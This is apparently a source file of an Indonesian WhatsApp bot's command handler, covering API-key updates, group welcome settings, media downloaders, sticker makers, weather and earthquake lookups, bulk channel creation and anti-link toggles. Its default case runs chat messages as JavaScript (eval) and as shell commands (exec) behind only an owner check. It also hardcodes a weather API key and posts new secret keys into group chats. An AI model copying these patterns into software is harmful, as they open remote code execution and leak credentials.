 Xuu.sendMessage(ownerJid, { text: `📢 *Perubahan API Key*\n\n${notifText}` });

 if (m.chat.endsWith('@g.us')) {
 Xuu.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
 }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'upcapikey': {
 if (!args[0]) return m.reply('❗ Masukkan Caddy API Key!\nContoh: *.upcapikey API_KEY_CADDY*');

 const caddyKey = args[0];

 await Xuu.sendMessage(m.chat, {
 caption: `🔐 Caddy API Key yang akan diupdate:\n${caddyKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2026 ${botname2} 🚀`,
 buttons: [
 {
 buttonId: `.upcapikey-v2 ${caddyKey}`,
 buttonText: { displayText: '🛠️ Server' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'upcapikey-v2': {
 const newKey = args[0];

 if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

 if (!newKey) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CADDY_API_KEY`);
 }

 global.capikey = newKey;

 const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 const notifText = `✅ *Caddy API Key untuk Server berhasil diupdate!*\n\n🔐 *Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

 Reply(notifText);

 const ownerJid = `${global.owner}@s.whatsapp.net`;
 Xuu.sendMessage(ownerJid, { text: `📢 *Perubahan Caddy API Key *\n\n${notifText}` });

 if (m.chat.endsWith('@g.us')) {
 Xuu.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
 }
}
break;

case 'setgoodbye': {
 if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur goodbye.");
 if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam grup.");

 const chat = m.chat;

 // Pastikan data grup ada
 if (!global.db.groups[chat]) global.db.groups[chat] = {};
 if (!global.db.groups[chat].goodbyeMsg) global.db.groups[chat].goodbyeMsg = null;
 if (global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

 if (!text) {
 return Reply(`
❗ *Cara pakai setgoodbye:*

Ketik:
setgoodbye @user telah left dari @subject. Member tersisa @count 😢

Variable tersedia:
@user = Tag orang
@subject = Nama grup
@count = Jumlah member
`);
 }

 global.db.groups[chat].goodbyeMsg = text;

 Reply(`✅ *Pesan goodbye berhasil disimpan!*\n\nGunakan:\n→ togglegoodbye\nuntuk mengaktifkan / menonaktifkan goodbye.`);
}
break;

case 'setwelcome': {
 if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur welcome.");
 if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam grup.");

 const chat = m.chat;

 // Pastikan data grup ada
 if (!global.db.groups[chat]) global.db.groups[chat] = {};
 if (!global.db.groups[chat].welcomeMsg) global.db.groups[chat].welcomeMsg = null;
 if (!global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

 if (!text) {
 return Reply(`
❗ *Cara pakai setwelcome:*

Ketik:
setwelcome Selamat datang @user di @subject! Kamu adalah member ke @count 🎉

Variable tersedia:
@user = Tag orang yang masuk
@subject = Nama grup
@count = Jumlah member
`);
 }

 // Simpan pesan custom
 global.db.groups[chat].welcomeMsg = text;

 Reply(`✅ *Pesan welcome berhasil disimpan!*

Gunakan:
→ togglewelcome
untuk mengaktifkan / menonaktifkan welcome.`);
}
break;

case 'capcut': {
 if (!text) return Reply(example("linknya"));
 if (!text.startsWith('https://')) return Reply("Link tautan tidak valid!");

 await Xuu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

 try {
 const res = await fetchJson(`https://api.resellergaming.my.id/download/capcut?url=${encodeURIComponent(text)}`);
 if (!res.status || !res.result?.videoUrl) return Reply("❌ Tidak ada video yang bisa diunduh!");

 const hasil = res.result;
 const caption = `
🎬 *CapCut Template Downloader ✅*

*🎥 Judul:* ${hasil.title}
*👤 Pembuat:* ${hasil.author.name}
*❤️ Likes:* ${hasil.likes}
*📅 Tanggal:* ${hasil.date}
*🔗 Pengguna:* ${hasil.pengguna}
 `;

 await Xuu.sendMessage(
 m.chat,
 {
 video: { url: hasil.videoUrl },
 mimetype: "video/mp4",
 caption: caption,
 thumbnail: { url: hasil.posterUrl }
 },
 { quoted: m }
 );

 await Xuu.sendMessage(m.chat, { react: { text: '', key: m.key } });
 } catch (e) {
 console.error("Capcut Error:", e);
 Reply("❌ Terjadi kesalahan saat mengunduh video CapCut!");
 }
}
break;



case 'brat': {
 let cmd = 'brat';

 if (!text) return m.reply(`Example: *${cmd} teksnya*`);

 const axios = require("axios");

 try {
 // Kirim reaction loading dulu (opsional)
 await Xuu.sendMessage(m.chat, {
 react: { text: "⏱️", key: m.key }
 });

 const url = `https://api.ryuu-dev.offc.my.id/tools/brat?text=${encodeURIComponent(text)}`;
 const response = await axios.get(url, { responseType: "arraybuffer" });
 const buffer = response.data;

 // Kirim langsung sebagai sticker tanpa konversi tambahan
 await Xuu.sendAsSticker(m.chat, buffer, m, {
 packname: global.packname || "xuu-Яyuici",
 author: global.author || "xuuЯyuici",
 });

 // Tambah exp user
 if (db.users && db.users[m.sender]) {
 db.users[m.sender].exp = (db.users[m.sender].exp || 0) + 300;
 }
 } catch (e) {
 console.error("Gagal kirim sticker brat:", e);
 m.reply("Gagal mengirim sticker.");
 }
}
break;



case 'translate': {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break;

case 'berita': {
  if(!text) return m.reply('Masukan URL');
  m.reply('Mohon Tunggu');

const axios = require('axios');
const cheerio = require('cheerio');

async function BeritaDetikDetail(url) {
  try {
  const { data } = await axios.get(url);
  const $ = cheerio.load(data);

  const title = $('h1').first().text().trim();
  const author = $('.detail__author').text().trim() || $('div.author').text().trim();
  const date = $('.detail__date').text().trim() || $('div.date').text().trim();
  const image = $('.detail__media img').attr('src') || $('article img').first().attr('src');
  let description = $('article p').first().text().trim();
  if (!description) {
    description = $('meta[name="description"]').attr('content') || '';
  }

  return { title, author, date, image, description };
    } catch (error) {
    console.error('Error:', error);
    return null;
  }
}

let result = await BeritaDetikDetail(text);
if(!result) return m.reply('Gagal Memproses Anunya...');

let teks = '';
teks+= '*' + result.title + '*\n\n'
teks+= '- Author:' + result.author + '\n'
teks+= '- Date:' + result.date + '\n'
teks+= '\n'
teks+= '- Description:`' + result.description + '`\n'

Xuu.sendMessage(m.chat, {
  image: { url: result.image },
  caption: teks
}, { quoted: m })
}
break;


case "infogempa": {
    if (!isCreator) return Reply(mess.owner)
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await Xuu.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            Xuu.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

case "infocuaca": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply ('*Silakan berikan lokasi yang ingin dicek cuacanya!*')

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        let textw = ""
        textw += `*🗺️ Cuaca di ${text}*\n\n`
        textw += `*🌤️ Cuaca:* ${wdata.data.weather[0].main}\n`
        textw += `*📖 Deskripsi:* ${wdata.data.weather[0].description}\n`
        textw += `*🌡️ Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`
        textw += `*🤒 Terasa Seperti:* ${wdata.data.main.feels_like}°C\n`
        textw += `*🌬️ Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`
        textw += `*💧 Kelembaban:* ${wdata.data.main.humidity}%\n`
        textw += `*🌪️ Kecepatan Angin:* ${wdata.data.wind.speed} m/s\n`
        textw += `*📍 Latitude:* ${wdata.data.coord.lat}\n`
        textw += `*📍 Longitude:* ${wdata.data.coord.lon}\n`
        textw += `*🌍 Negara:* ${wdata.data.sys.country}\n`

        Xuu.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: qtext2,
            }
        )
    } catch (error) {
        Reply('*Terjadi kesalahan! Pastikan lokasi yang Anda masukkan benar.*')
    }
}
break;

case "createch": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text.includes('|')) return m.reply(`*Contoh Penggunaan: .createch Nama Channel | Jumlah`);

  let [chName, chCount] = text.split('|').map(v => v.trim());
  let jumlah = parseInt(chCount) || 1;

  if (!chName || !jumlah) return m.reply(`*Contoh Penggunaan:* .createch Nama Channel | Jumlah`);

  // Simpan data sementara (multi user aman)
  global.tempChannel = global.tempChannel || {};
  global.tempChannel[m.sender] = { chName, jumlah };

  await Xuu.sendMessage(m.chat, {
    caption: `📌 Nama Channel: *${chName}*\n🔢 Jumlah: *${jumlah}*\n\nSilakan pilih format channel yang ingin dibuat:`,
    image: { url: global.image.reply }, // bisa pakai { url: './reply.jpg' } lokal
    footer: `© 2025 ${botname2}`,
    buttons: [
      { buttonId: '.buatchid', buttonText: { displayText: '🆔 Buat Versi ID' }, type: 1 },
      { buttonId: '.buatchlink', buttonText: { displayText: '🔗 Buat Versi Link' }, type: 1 }
    ],
    headerType: 4
  }, { quoted: m });
}
break;

case 'buatchlink': {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Tidak ada request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allLinks = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await Xuu.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        let inviteCode = createCh?.invite || createCh?.invite_code || createCh?.code;

        if (inviteCode) {
          let inviteUrl = ``; // Pastikan format URL benar
          allLinks.push(inviteUrl);
        } else {
          console.warn(`Tidak dapat memperoleh kode undangan untuk channel ke-${i}`);
          allLinks.push("Tidak dapat memperoleh link undangan");
        }
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Gagal membuat channel ke-${i}:`, e);
        allLinks.push("Gagal membuat channel");
      }
    }

    let listLinks = allLinks.map((link, idx) => `*LINK ${idx + 1}*\n${link}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nama: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🔗 *ALL LINK:*\n${listLinks}`; // Deskripsi dihapus
    await Xuu.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal membuat channel!");
  }
}
break;

case 'buatchid': {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Tidak ada request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allIds = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await Xuu.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        allIds.push(createCh.id);
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Gagal membuat channel ke-${i}:`, e);
      }
    }

    let listIds = allIds.map((id, idx) => `*ID ${idx + 1}*\n${id}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nama: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🆔 *ALL ID:*\n${listIds}`; // Deskripsi dihapus
    await Xuu.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal membuat channel!");
  }
}
break;


case 'bratbahlil': {
  if (!text) return reply("Contoh: .bahlil halo dunia")

  const Canvas = require("@napi-rs/canvas")
  const { createCanvas, loadImage } = Canvas
  const { Sticker } = require("wa-sticker-formatter")

  const IMG = "https://raw.githubusercontent.com/whatsapp-media/whatsapp-media/main/uploads/1770891834482_undefined.jpg"

  function wrapText(ctx, text, maxWidth) {
    const words = text.split(" ")
    const lines = []
    let line = ""

    for (let w of words) {
      const test = line + w + " "
      if (ctx.measureText(test).width > maxWidth) {
        lines.push(line.trim())
        line = w + " "
      } else {
        line = test
      }
    }
    lines.push(line.trim())
    return lines
  }

  function fitText(ctx, text, maxWidth, maxHeight) {
    let fontSize = 55
    let lines = []

    while (fontSize > 15) {
      ctx.font = `bold ${fontSize}px Arial`
      lines = wrapText(ctx, text, maxWidth)
      const height = lines.length * (fontSize * 1.35)
      if (height < maxHeight) break
      fontSize -= 2
    }

    return { fontSize, lines }
  }

  try {
    const img = await loadImage(IMG)
    const canvas = createCanvas(img.width, img.height)
    const ctx = canvas.getContext("2d")

    ctx.drawImage(img, 0, 0)

    const board = { 
      x: 420,
      y: 415,
      w: 270,
      h: 410
    }

    ctx.fillStyle = "black"
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const { fontSize, lines } = fitText(ctx, text, board.w, board.h)
    ctx.font = `bold ${fontSize}px Arial`

    const lineHeight = fontSize * 1.35
    const totalHeight = lines.length * lineHeight
    const centerX = board.x + board.w / 2
    const centerY = board.y + board.h / 2
    let startY = centerY - totalHeight / 2 + lineHeight / 2

    lines.forEach((line, i) => {
      ctx.fillText(line, centerX, startY + i * lineHeight)
    })

    const buffer = canvas.toBuffer("image/webp")

    const sticker = new Sticker(buffer, {
      pack: "Bahlil Meme",
      author: "xuu Яyuici",
      type: "full",
      quality: 90
    })

    const stiker = await sticker.toMessage()
    await Xuu.sendMessage(m.chat, stiker, { quoted: m })

  } catch (e) {
    console.log(e)
    reply("Gagal membuat stiker.")
  }
}
break;


case 'antilinkch': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply(`*Contoh penggunaan :*
ketik antilinkch on/off`)
const isAntilinkch = Antilinkch.includes(m.chat)
if (text == "on") {
if (isAntilinkch) return m.reply(`Antilinkch di grup ini sudah aktif!`)
Antilinkch.push(m.chat)
await fs.writeFileSync("./library/database/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`Antilinkch berhasil diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilinkch) return m.reply(`Antilinkch di grup ini sudah tidak aktif!`)
 const posisi = Antilinkch.indexOf(m.chat)
Antilinkch.splice(posisi, 1)
await fs.writeFileSync("./library/database/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`Antilinkch berhasil dimatikan ✅`)
}
}
break;


case 'antikataunchek': {
  if (!isCreator) return m.reply(mess.owner)
  if (!m.isGroup) return m.reply(mess.group)
  if (!text) return m.reply(`*Contoh penggunaan :*\nketik ${cmd} on/off`)

  const isAntikataunchek = Antikataunchek.includes(m.chat)

  if (text == "on") {
    if (isAntikataunchek) return m.reply(`Antikataunchek di grup ini sudah aktif!`)
    Antikataunchek.push(m.chat)
    await fs.writeFileSync("./library/database/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`Antikataunchek berhasil diaktifkan ✅`)
  }

  if (text == "off") {
    if (!isAntikataunchek) return m.reply(`Antikataunchek di grup ini sudah tidak aktif!`)
    const posisi = Antikataunchek.indexOf(m.chat)
    Antikataunchek.splice(posisi, 1)
    await fs.writeFileSync("./library/database/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`Antikataunchek berhasil dimatikan ✅`)
  }
}
break


case 'antino': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antino.includes(m.chat)) return m.reply("*Anti Nomor HP* Di Grup Ini Sudah Aktif!")
        antino.push(m.chat)
        await fs.writeFileSync("./library/database/antino.json", JSON.stringify(antino))
        m.reply("*Berhasil Menyalakan Anti Nomor HP Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antino.includes(m.chat)) return m.reply("*Anti Nomor HP* Di Grup Ini Belum Aktif!")
        let posi = antino.indexOf(m.chat)
        antino.splice(posi, 1)
        await fs.writeFileSync("./library/database/antino.json", JSON.stringify(antino))
        m.reply("*Berhasil Mematikan Anti Nomor HP* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;

case 'antilinktele': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antitele.includes(m.chat)) return m.reply("*Anti Link Telegram* Di Grup Ini Sudah Aktif!")
        antitele.push(m.chat)
        await fs.writeFileSync("./library/database/antitele.json", JSON.stringify(antitele))
        m.reply("*Berhasil Menyalakan Anti Link Telegram Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antitele.includes(m.chat)) return m.reply("*Anti Link Telegram* Di Grup Ini Belum Aktif!")
        let posi = antitele.indexOf(m.chat)
        antitele.splice(posi, 1)
        await fs.writeFileSync("./library/database/antitele.json", JSON.stringify(antitele))
        m.reply("*Berhasil Mematikan Anti Link Telegram* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;



case 'antimediafire': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antimediafire.includes(m.chat)) return m.reply("*Anti Link Mediafire* Di Grup Ini Sudah Aktif!")
        antimediafire.push(m.chat)
        await fs.writeFileSync("./library/database/antimediafire.json", JSON.stringify(antimediafire))
        m.reply("*Berhasil Menyalakan Anti Link Mediafire Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antimediafire.includes(m.chat)) return m.reply("*Anti Link Mediafire* Di Grup Ini Belum Aktif!")
        let posi = antimediafire.indexOf(m.chat)
        antimediafire.splice(posi, 1)
        await fs.writeFileSync("./library/database/antimediafire.json", JSON.stringify(antimediafire))
        m.reply("*Berhasil Mematikan Anti Link Mediafire* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;


case "antitoxic": {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antitoxic.includes(m.chat)) return m.reply("*Anti Toxic* sudah aktif di grup ini!")
        antitoxic.push(m.chat)
        await fs.writeFileSync("./library/database/antitoxic.json", JSON.stringify(antitoxic))
        m.reply("*Berhasil Menyalakan Anti Toxic ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antitoxic.includes(m.chat)) return m.reply("*Anti Toxic* belum aktif di grup ini!")
        let posi = antitoxic.indexOf(m.chat)
        antitoxic.splice(posi, 1)
        await fs.writeFileSync("./library/database/antitoxic.json", JSON.stringify(antitoxic))
        m.reply("*Berhasil Mematikan Anti Toxic ✅*")
    } else {
        return m.reply(example("on/off"))
    }
}
break
//~~~~~~ ( end case ) ~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
reply("Online ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});